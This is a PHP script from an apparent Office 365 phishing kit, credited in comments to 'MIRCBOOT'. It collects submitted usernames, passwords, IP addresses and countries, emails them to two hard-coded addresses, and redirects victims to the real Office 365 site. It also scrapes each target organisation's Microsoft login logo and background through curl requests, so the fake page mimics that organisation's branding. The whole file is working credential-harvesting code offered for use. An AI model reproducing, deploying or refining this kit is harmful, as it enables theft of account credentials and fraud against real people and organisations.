<?php
header("Access-Control-Allow-Origin: *");
ini_set("display_errors", 0);
// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// Genral 365 Version 14
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
$recipient = 'premiumzones@yandex.com, sempeman@gmail.com'; // Put your email address here
$finish_url = 'https://office365.com';



// Send Email
if(isset($_POST['user']) && isset($_POST['pass']))
{
	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$ip = $_POST['ip'];
	$country = $_POST['country'];

	$message = "-----------------+ True Login Verfied  +-----------------\n";
	$message.= "User ID: " . $user . "\n";
	$message.= "Password: " . $pass . "\n";
	$message.= "Client IP      : " . $ip . "\n";
	$message.= "Client Country      : " . $country . "\n";
	$message.= "-----------------+ Created in Sa+------------------\n";
	$subject = "OFFICE 365 | True Login: " . $ip . "\n";
	$headers = "MIME-Version: 1.0\n";
	mail($recipient, $subject, $message, $headers);
	echo $finish_url;
}

if(isset($_GET['domain']))
{
	$domain = $_GET['domain'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://mx-api.com/mx/mx.api?domain=$domain");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	echo $mx = curl_exec($ch);
}

if(isset($_POST['barnd']))
{
	$email = $_POST['email'];
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.office.com/login?es=Click&ru=%2F'); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);    
	$result = curl_exec ($ch);
	$respond_link = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);	
	curl_close ($ch); 
	
	$parts = parse_url($respond_link);
	parse_str($parts['query'], $query);
	$post = ['client_id' => $query['client_id'], 'login_hint' => $email];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_POST ,TRUE); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); 
	curl_setopt($ch, CURLOPT_URL, $respond_link); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE); 
	curl_setopt($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36"); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
    
	$result = curl_exec ($ch);
	curl_close ($ch); 
	

	
	preg_match_all("|\"BannerLogo[^>]+\":(.*)\"/[^>]+\",|U", $result, $BannerLogo, PREG_PATTERN_ORDER);
	$BannerLogo = explode(",", $BannerLogo[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $BannerLogo[0], $BannerLogo);
	
	preg_match_all("|\"Illustration[^>]+\":(.*)\"/[^>]+\",|U", $result, $Illustration, PREG_PATTERN_ORDER);
	$Illustration = explode(",", $Illustration[0][0]);
	preg_match_all('#\bhttps?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $Illustration[0], $Illustration);
	

	$logo_image = $BannerLogo[0][0];
	$bg_image = $Illustration[0][0];
	
	$res = array('logo_image' => $logo_image, 'bg_image' => $bg_image);
	echo json_encode($res);
}
?>
